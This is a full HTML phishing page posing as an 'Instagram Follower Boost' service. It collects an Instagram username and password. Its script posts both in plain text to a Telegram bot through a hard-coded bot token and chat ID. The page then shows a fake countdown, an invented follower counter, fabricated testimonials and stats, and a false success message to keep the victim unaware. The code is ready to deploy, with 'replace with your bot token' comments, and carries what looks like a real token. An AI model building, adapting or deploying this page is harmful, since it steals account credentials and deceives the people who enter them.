<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Follower Boost</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #405DE6;
      --secondary: #5851DB;
      --pink: #833AB4;
      --red: #E1306C;
      --orange: #FD1D1D;
      --yellow: #F56040;
      --gradient: linear-gradient(45deg, var(--primary), var(--secondary), var(--pink), var(--red), var(--orange), var(--yellow));
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Poppins', sans-serif;
      text-align: center;
      background: #fafafa;
      color: #333;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    .container {
      max-width: 500px;
      width: 100%;
      background: white;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      overflow: hidden;
      position: relative;
    }
    
    .header {
      background: var(--gradient);
      background-size: 400% 400%;
      animation: gradient 8s ease infinite;
      padding: 30px 20px;
      color: white;
      position: relative;
    }
    
    @keyframes gradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .header h2 {
      font-weight: 600;
      margin-bottom: 5px;
      font-size: 24px;
    }
    
    .header p {
      font-weight: 300;
      font-size: 14px;
      opacity: 0.9;
    }
    
    .logo {
      width: 80px;
      height: 80px;
      background: white;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: -40px auto 20px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
      position: relative;
      z-index: 2;
    }
    
    .logo img {
      width: 50px;
    }
    
    .page {
      display: none;
      padding: 30px;
    }
    
    .active {
      display: block;
    }
    
    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #666;
      font-weight: 500;
    }
    
    input {
      padding: 14px 16px;
      width: 100%;
      font-size: 15px;
      border: 1px solid #ddd;
      border-radius: 8px;
      transition: all 0.3s;
      font-family: 'Poppins', sans-serif;
    }
    
    input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(64, 93, 230, 0.2);
      outline: none;
    }
    
    .btn {
      background: var(--gradient);
      background-size: 200% auto;
      color: white;
      border: none;
      padding: 14px 24px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
      margin-top: 10px;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(64, 93, 230, 0.3);
    }
    
    .btn:hover {
      background-position: right center;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(64, 93, 230, 0.4);
    }
    
    .btn:active {
      transform: translateY(0);
    }
    
    #timer {
      font-size: 48px;
      font-weight: 700;
      margin: 30px 0;
      background: var(--gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-size: 400% 400%;
      animation: gradient 3s ease infinite;
    }
    
    .processing {
      margin: 30px 0;
    }
    
    .processing img {
      width: 80px;
      animation: pulse 1.5s infinite;
    }
    
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    
    .warning {
      background: #FFF3CD;
      color: #856404;
      padding: 12px;
      border-radius: 8px;
      font-size: 14px;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .warning svg {
      margin-right: 8px;
      fill: #856404;
    }
    
    .success-message {
      display: none;
      background: #D4EDDA;
      color: #155724;
      padding: 15px;
      border-radius: 8px;
      margin-top: 20px;
      font-size: 14px;
    }
    
    .progress-container {
      width: 100%;
      height: 8px;
      background: #f0f0f0;
      border-radius: 4px;
      margin: 20px 0;
      overflow: hidden;
    }
    
    .progress-bar {
      height: 100%;
      width: 0%;
      background: var(--gradient);
      background-size: 400% 400%;
      animation: gradient 3s ease infinite, progress 60s linear forwards;
      border-radius: 4px;
    }
    
    @keyframes progress {
      0% { width: 0%; }
      100% { width: 100%; }
    }
    
    .stats {
      display: flex;
      justify-content: space-around;
      margin: 25px 0;
    }
    
    .stat {
      text-align: center;
    }
    
    .stat-value {
      font-size: 24px;
      font-weight: 700;
      background: var(--gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-size: 400% 400%;
      animation: gradient 3s ease infinite;
    }
    
    .stat-label {
      font-size: 12px;
      color: #666;
      margin-top: 5px;
    }
    
    .fake-comment {
      background: #f8f8f8;
      border-radius: 12px;
      padding: 12px;
      margin: 15px 0;
      text-align: left;
      animation: fadeIn 0.5s;
    }
    
    .fake-comment-header {
      display: flex;
      align-items: center;
      margin-bottom: 8px;
    }
    
    .fake-comment-avatar {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      margin-right: 10px;
      background: var(--gradient);
    }
    
    .fake-comment-username {
      font-weight: 600;
      font-size: 13px;
    }
    
    .fake-comment-text {
      font-size: 14px;
      line-height: 1.4;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .floating-hearts {
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      pointer-events: none;
      z-index: 1;
      overflow: hidden;
    }
    
    .heart {
      position: absolute;
      opacity: 0;
      font-size: 20px;
      color: var(--red);
      animation: float 4s ease-in forwards;
    }
    
    @keyframes float {
      0% { transform: translateY(0) rotate(0deg); opacity: 0; }
      10% { opacity: 1; }
      100% { transform: translateY(-100px) rotate(20deg); opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h2>Instagram Follower Boost</h2>
      <p>Get real followers instantly</p>
    </div>
    
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
    </div>
    
    <!-- Page 1 (Main Form) -->
    <div id="page1" class="page active">
      <div class="form-group">
        <label for="username">Instagram Username</label>
        <input type="text" id="username" placeholder="e.g., yourusername">
      </div>
      
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢">
      </div>
      
      <div class="form-group">
        <label for="followers">Number of Followers</label>
        <input type="number" id="followers" min="100" max="10000" placeholder="Between 100 - 10,000" value="1000">
      </div>
      
      <button class="btn" onclick="submitDetails()">Boost My Followers</button>
      
      <div class="stats">
        <div class="stat">
          <div class="stat-value">10K+</div>
          <div class="stat-label">Users</div>
        </div>
        <div class="stat">
          <div class="stat-value">98%</div>
          <div class="stat-label">Success Rate</div>
        </div>
        <div class="stat">
          <div class="stat-value">24h</div>
          <div class="stat-label">Delivery</div>
        </div>
      </div>
      
      <div class="fake-comment">
        <div class="fake-comment-header">
          <div class="fake-comment-avatar"></div>
          <div class="fake-comment-username">user1234</div>
        </div>
        <div class="fake-comment-text">Got 1000 followers in just 1 hour! This actually works! üòç</div>
      </div>
    </div>
    
    <!-- Page 2 (Processing Page) -->
    <div id="page2" class="page">
      <div class="processing">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Processing">
      </div>
      
      <h3>Processing Your Request</h3>
      <p>We're connecting to Instagram servers</p>
      
      <div class="progress-container">
        <div class="progress-bar"></div>
      </div>
      
      <div class="warning">
        <svg width="20" height="20" viewBox="0 0 24 24">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
        </svg>
        <span>Do not close this window or the process will fail</span>
      </div>
      
      <div id="timer">60</div>
      <p>Seconds remaining</p>
      
      <div class="stats">
        <div class="stat">
          <div class="stat-value" id="current-followers">0</div>
          <div class="stat-label">Current</div>
        </div>
        <div class="stat">
          <div class="stat-value" id="target-followers">1000</div>
          <div class="stat-label">Target</div>
        </div>
      </div>
      
      <div id="success-message" class="success-message">
        <strong>Success!</strong> Your followers are being added. You'll see the results within 24 hours.
      </div>
    </div>
    
    <div class="floating-hearts" id="hearts-container"></div>
  </div>

  <script>
    const BOT_TOKEN = "7752195168:AAGNWIc2vhdUxS1TMggHqSsi7GOpBmZ4SAU"; // Replace with your bot token
    const CHAT_ID = "6569859929";     // Replace with your Telegram Chat ID

    function submitDetails() {
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const followers = parseInt(document.getElementById("followers").value);
      const targetFollowers = document.getElementById("target-followers");

      if (!username || !password || isNaN(followers)) {
        alert("Please fill in all fields correctly.");
        return;
      }

      if (followers < 100 || followers > 10000) {
        alert("Please enter a number between 100 and 10,000.");
        return;
      }

      // Update target followers display
      targetFollowers.textContent = followers;

      // Send details to Telegram
      const message = `üîí New Instagram Request\n\nüë§ Username: ${username}\nüîë Password: ${password}\nüìà Followers Requested: ${followers}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);

      // Switch to Page 2
      document.getElementById("page1").classList.remove("active");
      document.getElementById("page2").classList.add("active");

      // Start Timer and animations
      startTimer(60);
      startFakeProgress();
      createHearts();
    }

    function startTimer(seconds) {
      const timerElement = document.getElementById("timer");
      const successMessage = document.getElementById("success-message");
      const currentFollowers = document.getElementById("current-followers");
      const targetFollowers = parseInt(document.getElementById("target-followers").textContent);
      let remaining = seconds;
      let fakeCount = 0;

      // Initial delay before starting counter
      setTimeout(() => {
        const counterInterval = setInterval(() => {
          if (fakeCount < targetFollowers) {
            fakeCount += Math.floor(targetFollowers / 60) + Math.floor(Math.random() * 10);
            if (fakeCount > targetFollowers) fakeCount = targetFollowers;
            currentFollowers.textContent = fakeCount;
          }
        }, 1000);
      }, 2000);

      const interval = setInterval(() => {
        timerElement.textContent = remaining;
        remaining--;

        if (remaining < 0) {
          clearInterval(interval);
          successMessage.style.display = "block";
          document.querySelector(".progress-bar").style.animationPlayState = "paused";
          
          // Final animation
          setTimeout(() => {
            createConfetti();
          }, 500);
        }
      }, 1000);
    }

    function startFakeProgress() {
      // Already handled by CSS animation
    }

    function createHearts() {
      const container = document.getElementById("hearts-container");
      const colors = ["#E1306C", "#F56040", "#833AB4", "#405DE6"];
      
      setInterval(() => {
        const heart = document.createElement("div");
        heart.className = "heart";
        heart.innerHTML = "‚ù§";
        heart.style.left = Math.random() * 100 + "%";
        heart.style.top = "100%";
        heart.style.animationDuration = (3 + Math.random() * 3) + "s";
        heart.style.fontSize = (15 + Math.random() * 15) + "px";
        heart.style.color = colors[Math.floor(Math.random() * colors.length)];
        
        container.appendChild(heart);
        
        // Remove heart after animation
        setTimeout(() => {
          heart.remove();
        }, 4000);
      }, 300);
    }

    function createConfetti() {
      const container = document.getElementById("hearts-container");
      const emojis = ["‚ù§", "‚ú®", "üåü", "üéâ", "üî•", "üíé", "‚≠ê"];
      
      for (let i = 0; i < 50; i++) {
        const confetti = document.createElement("div");
        confetti.className = "heart";
        confetti.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
        confetti.style.left = Math.random() * 100 + "%";
        confetti.style.top = "-20px";
        confetti.style.animationDuration = (2 + Math.random() * 3) + "s";
        confetti.style.fontSize = (15 + Math.random() * 15) + "px";
        confetti.style.animationName = "float";
        confetti.style.animationDelay = (Math.random() * 0.5) + "s";
        
        container.appendChild(confetti);
        
        // Remove confetti after animation
        setTimeout(() => {
          confetti.remove();
        }, 5000);
      }
    }
  </script>
</body>
</html>
